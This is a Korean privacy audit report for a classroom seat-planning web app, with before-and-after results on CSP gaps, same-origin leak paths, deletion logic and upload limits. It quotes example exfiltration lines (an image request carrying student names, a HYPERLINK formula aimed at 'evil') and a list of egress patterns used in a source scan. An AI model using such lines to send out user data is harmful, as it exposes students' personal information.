# 개인정보 감사 보고서

**대상** 자리배치 도우미 · 커밋 `1a5f0b6` 시점
**기준** 문서의 주장이 아니라 **소스 코드와 프로덕션 빌드 산출물의 실측**
**환경** 프로덕션 빌드(`vite build`) → `vite preview` → Chromium(Playwright)

이 문서는 **수정 전 상태**의 감사 결과입니다. 수정 후 재감사는 「재감사 결과」 절에 있습니다.

---

## 0. 판정 요약

| # | 항목 | 판정 |
| --- | --- | --- |
| F1 | 동일 출처로 학생 데이터 유출 가능 (8개 경로 실측 도달) | **FAIL** |
| F2 | 서비스워커가 생성되지만 **등록되지 않음** → PWA·오프라인 미동작 | **FAIL** |
| F3 | `frame-ancestors`는 meta CSP에서 **무시됨** → 클릭재킹 방어 없음 | **FAIL** |
| F4 | CSP가 meta 전용, HTTP 응답 헤더 없음 | **PARTIAL** |
| F5 | 「모든 정보 삭제」가 **오리진의 모든 캐시**를 삭제 | **PARTIAL** |
| F6 | `deleteDatabase` 검증 결함 — 미지원 환경에서 거짓 「확인 완료」 | **FAIL** |
| F7 | 사용하지 않는 런타임 의존성 6개 선언 | **PARTIAL** |
| F8 | 업로드 크기·행·열 제한 없음 | **PARTIAL** |
| F9 | `cdnjs.cloudflare.com` — 도달 불가 경로임을 증명 | **PASS** |
| F10 | XLSX 수식 인젝션 — 실측상 해당 없음 | **PASS** |
| F11 | 교차 출처 통신 차단 | **PASS** |
| F12 | 저장 끔 상태에서 새로고침 후 잔존 없음 | **PASS** |
| F13 | 앱 자체는 어떤 유출 경로도 사용하지 않음 | **PASS** |

---

## 1. 검사 범위 (항목 1)

| 대상 | 결과 |
| --- | --- |
| `src/` 52개 파일 | 전수 grep |
| `public/icon.svg` | 검사 — 외부 참조 없음 |
| `index.html` | 검사 — 아래 F4 참조 |
| `dist/` 11개 산출물 | 전수 URL 추출 |
| `dist/sw.js`, `dist/workbox-*.js` | 프리캐시 목록·핸들러 검사 |
| `vite.config.ts`, `package.json`, `package-lock.json` | 검사 |
| 런타임 라이브러리 12개 | 번들 포함 여부 확인 |

---

## 2. 유출 경로 전수 조사 (항목 2)

### 2-1. 앱 소스 — **PASS**

`src/` 전체에서 다음 패턴을 검색했습니다.

```
fetch(  XMLHttpRequest  WebSocket  EventSource  sendBeacon  .submit(
<form  action=  .src=  <img  <script  <iframe  window.open
location=  location.href  location.assign  location.replace
navigator.share  navigator.clipboard  ReportingObserver
importScripts  import(  url(  postMessage
```

**적중 2건, 둘 다 무해함이 확인됨:**

| 위치 | 내용 | 판정 |
| --- | --- | --- |
| `src/ui/export/download.ts:26` | `document.createElement('a')` | href가 `URL.createObjectURL(blob)` → `blob:` 스킴. 네트워크 아님. `download` 속성으로 내비게이션도 아님 |
| `src/lib/solverClient.ts`, `src/workers/solver.worker.ts` | `postMessage` | 같은 탭 안의 Web Worker 통신. 네트워크 아님 |

**앱 자신은 어떤 유출 경로도 사용하지 않습니다.**

### 2-2. 브라우저 차원 — **FAIL** (F1)

앱이 쓰지 않는 것과, 앱이 쓸 수 **없는** 것은 다릅니다. 15개 경로에 표식
`ZZPROBEMARK7396`을 실어 실제로 시도하고 **각 요청의 결말**을 기록했습니다.

> **측정 주의:** Playwright의 `request` 이벤트 발생은 「바이트가 나갔다」는 뜻이 아닙니다.
> Chrome은 요청 이벤트를 올린 뒤 CSP로 실패시킵니다. 그래서 `requestfinished`(전달됨)와
> `requestfailed`(차단됨, 사유 포함)를 구분해 측정했습니다. 이 구분이 없으면
> 교차 출처 차단을 유출로 오판합니다.

| 경로 | 대상 | 결말 |
| --- | --- | --- |
| fetch POST | 동일 출처 | 차단 (`net::ERR_ABORTED`, preflight 없이 405) |
| **fetch GET + 쿼리** | 동일 출처 | **전달됨** |
| fetch | 교차 출처 | 차단 (`TypeError`) |
| **XHR POST** | 동일 출처 | **전달됨 (본문에 표식)** |
| **sendBeacon** | 동일 출처 | **전달됨 (본문에 표식)** |
| **EventSource** | 동일 출처 | **전달됨** |
| **`new Image().src`** | 동일 출처 | **전달됨** |
| `new Image().src` | 교차 출처 | **차단 (`csp`)** |
| **CSS `url()`** | 동일 출처 | **전달됨** |
| **`<iframe src>`** | 동일 출처 | **전달됨** |
| **`<link rel=prefetch>`** | 동일 출처 | **전달됨** |
| `<script src>` | 교차 출처 | **차단 (`csp`)** |
| `window.open` | 동일 출처 | 차단 (팝업 차단) |
| form submit | 동일 출처 | 요청 미발생 (`form-action 'none'`) |
| WebSocket | 동일 출처 | 요청 미발생 |

**서버에 실제로 도달한 표식 요청: 8건.**

### 2-3. 이것이 왜 문제인가

PRIVACY.md는 이렇게 적고 있습니다.

> 「앱 코드든 서드파티 라이브러리든 fetch/XHR/WebSocket/sendBeacon이 브라우저 레벨에서
> 차단됩니다. **이것이 가장 강한 보증입니다.**」

**이 문장은 교차 출처에 한해 참이고, 호스팅 서버에 대해서는 거짓입니다.**

GitHub Pages에 올린 경우 `new Image().src = '/?d=' + 학생이름들` 한 줄이면
학생 명단이 **GitHub의 접근 로그에 남습니다.** 공격 시나리오는 가정이 아닙니다.

- 의존성 12개 중 하나가 공급망 공격을 당하는 경우
- 향후 기여자가 악의적·부주의한 코드를 넣는 경우
- 어떤 형태로든 XSS가 성립하는 경우

「보낼 서버가 없다」는 1겹은 **정적 호스팅 서버는 있다**는 사실을 빠뜨렸습니다.

---

## 3. connect-src 'self' 검증 (항목 3)

**동일 출처 전송 가능함이 실측으로 확인**되었습니다(위 8건). `connect-src`를 `'none'`으로
바꾸면 fetch·XHR·beacon·EventSource·WebSocket 4~5개 경로가 닫히지만,
`img-src 'self'`·`default-src 'self'`가 남기는 **이미지·CSS·iframe·prefetch 경로는
그대로 열려 있습니다.** `connect-src`만 바꾸는 것은 부분적 조치입니다.

수정 절에서 전체 지시문을 함께 조이고, PWA 설치·오프라인·업데이트·업로드·내보내기
전부를 재시험합니다.

---

## 4. CSP 적용 시점과 범위 (항목 4)

### 4-1. meta 태그 위치 — **PASS**

`dist/index.html`에서 CSP `<meta>`는 `<meta charset>` 바로 다음, **모든 리소스 로딩
태그(`<script>`, `<link>`)보다 앞**에 있습니다. CSP 적용 전에 로드되는 리소스는 없습니다.

### 4-2. HTTP 응답 헤더 부재 — **PARTIAL** (F4)

CSP는 **meta 태그로만** 전달됩니다. GitHub Pages는 사용자 지정 응답 헤더를 지원하지
않으므로 배포본에서도 meta 전용입니다.

### 4-3. meta CSP에서 무시되는 지시문 — **FAIL** (F3)

CSP 명세상 **`frame-ancestors`는 meta 태그로 전달될 때 반드시 무시**됩니다.
현재 정책에 `frame-ancestors 'none'`이 들어 있지만 **아무 효력이 없습니다.**
악성 사이트가 이 앱을 iframe으로 감싸 클릭재킹할 수 있습니다.

`sandbox`, `report-uri`도 meta에서 무시됩니다(현재 미사용).

---

## 5. 저장소 잔존 (항목 6) — **PASS** (F12)

저장 기능이 꺼진 기본 상태에서 5개 필드에 고유 표식을 넣고 새로고침한 뒤
localStorage · sessionStorage · Cache Storage(키와 본문) · IndexedDB 존재 여부 ·
화면 텍스트를 모두 검사했습니다. **잔존 0건.**

---

## 6. 삭제 로직 (항목 7) — **FAIL** (F6)

`src/lib/storage.ts`

| 문제 | 상세 |
| --- | --- |
| **거짓 「확인 완료」** | `indexedDB.databases()` 미지원(Firefox 등)이면 `databaseGone = true`가 그대로 유지되어 **확인하지 않고 확인했다고 표시**합니다. 항목 7이 요구한 「확인 불가 표시」가 없습니다 |
| **연결 미종료** | `withStore`가 `tx.oncomplete`에서만 `db.close()`를 호출합니다. 트랜잭션이 abort·error로 끝나면 연결이 남아 `deleteDatabase`를 blocked 시킵니다 |
| **blocked 처리** | `onblocked`에서 `resolve(false)`로 즉시 반환합니다. 삭제 요청은 살아 있어 나중에 완료될 수 있는데, 그 사이 앱은 진행합니다 |
| 성공 메시지 시점 | `verifiedEmpty`가 true일 때만 성공 문구를 띄우므로 이 부분은 정상 |

## 7. Cache Storage 삭제 범위 (항목 8) — **PARTIAL** (F5)

```ts
const names = await caches.keys();
for (const name of names) await caches.delete(name);   // 전부 삭제
```

**오리진의 모든 캐시를 삭제**합니다. `user.github.io` 같은 공유 오리진에 다른 앱이
배포되어 있으면 **남의 앱 캐시까지 지웁니다.** workbox가 만드는 이름은
`workbox-precache-v2-<scope>` 접두사이므로 이것만 골라 지워야 합니다.

---

## 8. 내보내기 유출 (항목 9) — **PARTIAL**

현재 E2E는 `teacherMemo` **한 필드에 한 표식**만 검사합니다.
`accessibilityNeeds`(배려 사항), 제약 조건의 `note`, `excludeNote`(제외 사유), `division`,
`tags`는 **값 수준 검사가 없습니다.** 필드명 검사(`findLeakedFields`)는 있지만
값이 다른 필드에 섞여 나가는 경우를 잡지 못합니다.

## 9. 수식 인젝션 (항목 10) — **PASS** (F10)

`=1+1`, `+1+1`, `-1+1`, `@SUM(A1)`, `=HYPERLINK("http://evil/?x="&A1,...)`, `\t=1+1`을
이름·태그·메모에 넣고 XLSX로 내보낸 뒤 셀을 직접 확인했습니다.

```
B6: t=s  f=없음  v="=HYPERLINK(\"http://evil/?x=\"&A1,\"click\")"
왕복 후 수식 셀 개수: 0
원본 XML에 <f> 태그 존재? false
```

**모두 문자열 셀(`t='s'`)로 기록되고 `<f>` 태그가 없어 Excel이 평가하지 않습니다.**
`.xlsx`는 셀 타입이 명시적이라 CSV와 달리 인젝션이 성립하지 않습니다.
**이 앱은 CSV 내보내기를 제공하지 않으므로** CSV 인젝션 표면도 없습니다.

> 따옴표 접두사(`'`) 방어는 **추가하지 않는 것이 맞습니다.** 타입 안전한 xlsx에
> 접두사를 붙이면 「-지각 잦음」 같은 정상 메모 앞에 작은따옴표가 보이게 되어
> 없는 문제를 만들면서 데이터를 손상시킵니다. 대신 이 동작을 회귀 테스트로 고정합니다.

## 10. 업로드 방어 (항목 11) — **PARTIAL** (F8)

| 항목 | 현재 |
| --- | --- |
| 파일 크기 제한 | **없음** |
| 행·열 수 제한 | **없음** |
| 수식 | `cellFormula: false` — 읽지 않음 ✓ |
| 스타일·HTML | `cellStyles:false`, `cellHTML:false` ✓ |
| 숨김 시트 | 읽되 목록에서 「숨김」 표시 ✓ (의도된 동작) |
| 외부 링크 | SheetJS가 관계 항목을 파싱하나, 우리는 셀 값만 사용하고 네트워크 접근은 CSP가 차단 |
| 비정상 압축(zip bomb) | **방어 없음** — 큰 파일로 탭이 멈출 수 있음 |

영향은 **사용자 자신의 탭 정지**에 한정되며 데이터 유출은 아닙니다. 그래도 교사가
잘못된 파일을 골랐을 때 앱이 죽는 대신 설명해야 합니다.

---

## 11. 프로덕션 빌드 URL 전수 (항목 12)

`dist`에서 추출한 고유 URL **84개**를 성격별로 분류했습니다.

| 분류 | 개수 | 출처 | 실행 가능? |
| --- | --- | --- | --- |
| XML 네임스페이스 식별자 | 61 | SheetJS, jsPDF | **아니오.** `schemas.openxmlformats.org`, `w3.org`, `purl.org`, `docs.oasis-open.org`, `openoffice.org`, `schemas.microsoft.com` 등은 XML 문서의 식별 문자열이며 가져오지 않습니다 |
| 라이선스·저작자 주석 | 12 | html2canvas, core-js, zustand, jsPDF | **아니오.** `/*! html2canvas 1.4.1 <https://html2canvas.hertzen.com> */` 형태의 주석 |
| 오류 메시지 문자열 | 2 | React, workbox | **아니오.** `reactjs.org/docs/error-decoder.html?invariant=`는 던져지는 Error의 **본문 문자열**로 연결됩니다. `bit.ly/wb-precache`는 `console.warn` 문구 |
| SheetJS 데모 데이터 | 2 | SheetJS | **아니오.** 내장 예제 시트의 셀 값 |
| **실행 가능 코드 경로** | **1** | **jsPDF** | **아래 참조** |

### `https://cdnjs.cloudflare.com/ajax/libs/pdfobject/2.1.1/pdfobject.min.js`

**출처 규명:** jsPDF의 `output()` 함수 안, `case "pdfobjectnewwindow":` 분기입니다.
이 분기는 `<script src>`를 새 창에 삽입해 PDF 미리보기 라이브러리를 불러옵니다.

**도달 불가 증명 (2중):**

1. **호출부가 없음.** 이 앱의 유일한 jsPDF 출력 호출은
   `src/ui/export/image.ts:137`의 `pdf.save(fileName)` 한 곳입니다.
   `output('pdfobjectnewwindow')`를 부르는 코드가 존재하지 않습니다.
2. **불려도 차단됨.** 탐침에서 교차 출처 `<script src>` 삽입이
   `(csp)`로 차단되는 것을 **실측 확인**했습니다. `script-src 'self'`가 막습니다.

---

## 12. 미사용 의존성 (F7)

| 패키지 | import 파일 수 | 번들 포함 |
| --- | --- | --- |
| `@dnd-kit/core`, `@dnd-kit/utilities` | **0** | 0회 |
| `@radix-ui/react-{dialog,switch,tabs,tooltip}` | **0** | 0회 |

번들에는 들어가지 않으므로 **런타임 위험은 없습니다.** 다만 `package.json`이 쓰지도
않는 패키지 6개를 선언하고 있어 lock 파일과 CI 설치 표면이 불필요하게 넓습니다.
설계 초기에 계획했다가 인라인 SVG와 자체 컴포넌트로 대체하면서 남은 것입니다.

---

## 13. 사실 · 추정 · 미확인 구분 (항목 13)

### 확인된 사실 (실측)
- 동일 출처 8개 경로로 표식이 서버에 도달함
- 교차 출처 이미지·스크립트는 CSP가 차단함
- 서비스워커가 등록되지 않음 (`src`·`dist` 어디에도 `serviceWorker` 문자열 없음)
- XLSX가 문자열 셀로 기록되어 수식이 평가되지 않음
- 저장 끔 상태에서 새로고침 후 잔존 0건
- 미사용 의존성 6개가 번들에 없음
- `cdnjs` 문자열이 `pdfobjectnewwindow` 분기 내부에 있고 우리는 `save()`만 호출함

### 추정 (근거는 있으나 미실측)
- `connect-src 'none'`이 서비스워커 프리캐시를 깨지 않을 것 — 서비스워커는 자신의
  응답 헤더에서 CSP를 받으며 문서의 meta CSP를 상속하지 않기 때문. **수정 후 실측 예정**
- manifest에 적힌 아이콘은 브라우저가 가져가므로 `img-src` 축소의 영향을 받지 않을 것.
  **수정 후 실측 예정**

### 미확인
- **Firefox·Safari에서의 동작 전반.** 모든 실측은 Chromium 한 종에서만 수행했습니다
- **실제 GitHub Pages 배포본의 응답 헤더.** 배포한 적이 없어 확인 불가.
  GitHub Pages가 사용자 지정 헤더를 지원하지 않는다는 문서 근거에 의존
- **`vite preview`와 GitHub Pages의 차이.** preview는 POST에 405를 반환하지만
  요청 자체는 도달합니다. 실제 호스트의 로그 정책은 확인 불가

---

## 14. PRIVACY.md 문장별 판정

| 문장 | 판정 | 근거 |
| --- | --- | --- |
| 「학생 정보는 어떤 서버로도 전송되지 않습니다」 | **PARTIAL** | 앱은 보내지 않음(PASS). 그러나 브라우저가 막지 못하므로 「불가능」이 아니라 「하지 않음」 |
| 「이 프로젝트에는 서버 코드가 존재하지 않습니다」 | **PASS** | 확인 |
| 「connect-src 'self'가 가장 강한 보증입니다」 | **FAIL** | 동일 출처 8경로 도달 실측 |
| 「fetch/XHR/WebSocket/sendBeacon이 브라우저 레벨에서 차단됩니다」 | **FAIL** | 동일 출처에서는 차단되지 않음 |
| 「form-action 'none'은 어떤 폼도 제출될 수 없게 합니다」 | **PASS** | 폼 제출 요청 미발생 확인 |
| 「frame-ancestors 'none'은 iframe 감싸기를 막습니다」 | **FAIL** | meta CSP에서 무시되는 지시문 |
| 「소스 스캔이 fetch·외부 URL·글꼴을 막습니다」 | **PARTIAL** | 검사 대상에 `img.src`·`form`·`iframe`·`window.open` 등이 빠져 있음 |
| 「E2E가 외부 요청 0건을 단언합니다」 | **PARTIAL** | 외부만 검사, 동일 출처 미검사. 본문·쿼리 미검사 |
| 「서비스워커는 앱 셸만 프리캐시합니다」 | **PARTIAL** | 프리캐시 목록은 앱 셸만 맞으나 **서비스워커가 실행되지 않음** |
| 「PWA로 설치하면 인터넷 없이도 열립니다」 | **FAIL** | 등록 코드 부재로 미동작 |
| 「삭제 후 재확인으로 잔존 0건을 검증합니다」 | **PARTIAL** | `indexedDB.databases()` 미지원 환경에서 거짓 보고 |
| 「서비스워커 캐시에 원본 엑셀이 들어가지 않습니다」 | **PASS** | 프리캐시 목록 확인. 서비스워커가 돌지 않아 캐시 자체가 없음 |
| 「프로덕션에서 콘솔 출력이 전부 비활성화됩니다」 | **PASS** | `log.ts` 확인, 소스 스캔 통과 |
| 「파일명·URL에 학생 이름이 없습니다」 | **PASS** | 실측 확인 |
| 「학생용 내보내기에서 교사 정보가 제거됩니다」 | **PARTIAL** | 필드명 검사는 있으나 값 수준 검사가 한 필드뿐 |
| 「cdnjs 문자열은 도달하지 않는 코드입니다」 | **PASS** | 2중 증명 |
| 「.gitignore가 실제 명렬표 커밋을 막습니다」 | **PASS** | 확인 |

---

## 15. 재감사 결과 (수정 후)

동일한 도구를 그대로 다시 실행했습니다.

### 15-1. 유출 경로 전후 비교

| 경로 | 수정 전 | 수정 후 |
| --- | --- | --- |
| fetch POST (동일 출처) | 차단 | **차단** (`TypeError`) |
| fetch GET + 쿼리 (동일 출처) | **전달됨** | **차단** (`TypeError`) |
| XHR POST (동일 출처) | **전달됨** | **차단** (`csp`) |
| sendBeacon (동일 출처) | **전달됨** | **차단** (요청 미발생) |
| EventSource (동일 출처) | **전달됨** | **차단** (`csp`) |
| `Image.src` (동일 출처) | **전달됨** | **차단** (`csp`) |
| CSS `url()` (동일 출처) | **전달됨** | **차단** (`csp`) |
| `<iframe src>` (동일 출처) | **전달됨** | **차단** (요청 미발생) |
| `<link rel=prefetch>` (동일 출처) | **전달됨** | **전달됨 — 아래 참조** |
| `Image.src` (교차 출처) | 차단 | 차단 (`csp`) |
| `<script src>` (교차 출처) | 차단 | 차단 (`csp`) |
| `<link rel=prefetch>` (교차 출처) | 미측정 | **차단** (`csp`) |
| `<link rel=preconnect>` (교차 출처) | 미측정 | 차단 |

**서버에 도달한 표식 요청: 8건 → 1건. 교차 출처 도달: 0건 → 0건.**

### 15-2. 남은 한 건 — 동일 출처 prefetch

`<link rel="prefetch">`는 **현재 Chrome의 어떤 CSP 지시문으로도 막을 수 없습니다.**
`prefetch-src`가 제거되었고 `default-src 'none'`으로 대체되지도 않습니다.
교차 출처 prefetch는 차단되므로(실측) **제3자에게는 새지 않고, 호스팅 서버의
접근 로그까지만** 도달할 수 있습니다.

브라우저가 막을 수 없으므로 소스 스캔이 대신 막습니다. 단위 테스트
`uses no egress mechanism of any kind`가 `src/` 어디든 `rel="prefetch"`가 나타나면
실패합니다. E2E는 이 한 건을 **이름 붙인 예외**로 고정해, 다른 경로가 새로 열리면
즉시 실패합니다.

### 15-3. CSP가 원리상 막을 수 없는 것

정직하게 적어 둡니다. **내비게이션은 CSP의 사정권 밖입니다.**
`location.href = 'https://…?d=' + 이름들`이나 사용자 클릭에 반응하는
`window.open(...)`은 어떤 지시문으로도 차단되지 않습니다(`navigate-to`는 명세에서
철회됨). 이 앱이 그런 코드를 갖지 않는다는 것만이 방어이며, 소스 스캔이
`location.href`·`window.open`·`form.submit()`을 검사합니다.

**서비스워커는 자신의 CSP를 가집니다.** 문서의 meta CSP를 상속하지 않으므로,
정적 호스트에서는 사실상 정책이 없습니다. 우리 서비스워커는 빌드 산출물이고
앱 셸만 프리캐시하지만, 이 사실 자체는 기록해 둡니다.

### 15-4. 항목별 재판정

| # | 항목 | 전 | 후 | 조치 |
| --- | --- | --- | --- | --- |
| F1 | 동일 출처 유출 | FAIL | **PARTIAL** | CSP를 default-deny로 재작성. 8→1건. 남은 1건은 브라우저 한계 |
| F2 | 서비스워커 미등록 | FAIL | **PASS** | `src/lib/pwa.ts` 추가, 설정에 명시적 스위치. 네트워크를 끊고 새로고침해 실제 동작 확인 |
| F3 | frame-ancestors 무효 | FAIL | **PARTIAL** | meta에서 제거(거짓 안심 방지), `public/_headers`로 이전, 문서에 한계 명시 |
| F4 | CSP meta 전용 | PARTIAL | **PASS** | 헤더 지원 호스트용 `_headers` 제공, GitHub Pages 한계를 문서화 |
| F5 | 캐시 전체 삭제 | PARTIAL | **PASS** | `workbox-`·`seat-planner` 접두사만 삭제, 건너뛴 개수를 화면에 표시 |
| F6 | 삭제 검증 결함 | FAIL | **PASS** | 연결을 모든 경로에서 종료, `deleted`/`blocked`/`failed` 구분, 미지원 시 «확인 불가» 표시 |
| F7 | 미사용 의존성 | PARTIAL | **PASS** | 6개 제거 (`@dnd-kit` 2, `@radix-ui` 4) |
| F8 | 업로드 제한 없음 | PARTIAL | **PASS** | 20MB·20,000행·512열·100시트 상한과 안내 문구 |
| F9 | cdnjs | PASS | **PASS** | 변화 없음 (2중 증명 유지) |
| F10 | 수식 인젝션 | PASS | **PASS** | 회귀 테스트로 고정 |
| F11 | 교차 출처 차단 | PASS | **PASS** | 유지, 측정 항목 3개 추가 |
| F12 | 저장 잔존 | PASS | **PASS** | 유지 |
| F13 | 앱 자체 유출 코드 | PASS | **PASS** | 소스 스캔을 6개 → 15개 패턴으로 확대 |

### 15-5. 테스트 증가

| | 전 | 후 |
| --- | --- | --- |
| 단위 테스트 | 182 | **187** |
| E2E | 18 | **25** |
| 유출 경로 탐침 | 0 | **17개 경로** |
| 소스 스캔 패턴 | 6 | **15** |
| 내보내기 표식 | 1 필드 | **6 필드, 값 수준** |

---

## 16. 원래의 수정 계획 (모두 반영됨)

| 우선 | 조치 |
| --- | --- |
| 1 | CSP를 `default-src 'none'` 기반으로 재작성하고 `connect-src 'none'`, `img-src` 축소. PWA·오프라인·업로드·내보내기 전부 재시험 |
| 2 | 서비스워커 등록 코드를 실제로 작성하거나, 못 쓰면 PWA 주장을 문서에서 삭제 |
| 3 | `frame-ancestors` 무효 사실을 문서에 명시하고, 헤더를 설정할 수 있는 호스트용 설정 파일 제공 |
| 4 | 삭제 로직: 연결 종료 → blocked/error/success 분리 처리 → 미지원 시 「확인 불가」 표시 |
| 5 | 캐시 삭제를 `workbox-`·`seat-planner` 접두사로 한정 |
| 6 | 감사 테스트를 정규 테스트 스위트에 편입 (동일 출처·본문·쿼리 포함) |
| 7 | 내보내기 필드별 고유 표식 값 검사 |
| 8 | 업로드 크기·행·열 상한과 안내 |
| 9 | 미사용 의존성 6개 제거 |
| 10 | XLSX 문자열 셀 동작을 회귀 테스트로 고정 |
